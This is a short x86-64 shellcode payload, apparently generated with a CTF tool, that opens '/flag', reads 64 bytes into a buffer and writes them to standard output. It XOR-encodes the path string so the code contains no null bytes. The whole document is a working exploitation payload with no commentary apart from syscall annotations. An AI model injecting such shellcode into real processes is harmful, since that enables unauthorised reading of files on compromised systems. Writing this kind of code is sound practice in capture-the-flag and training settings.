mov r13, rdx
/* open(file='/flag\x00', oflag=0, mode=0) */
/* push b'/flag\x00' */
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c662f
xor [rsp], rax
mov rdi, rsp
xor edx, edx /* 0 */
xor esi, esi /* 0 */
/* call open() */
push SYS_open /* 2 */
pop rax
syscall

/* call read('rax', 'r13', 0x40) */
mov rdi, rax
xor eax, eax /* SYS_read */
push 0x40
pop rdx
mov rsi, r13
syscall

push 1
pop rdi
push 1
pop rax
syscall
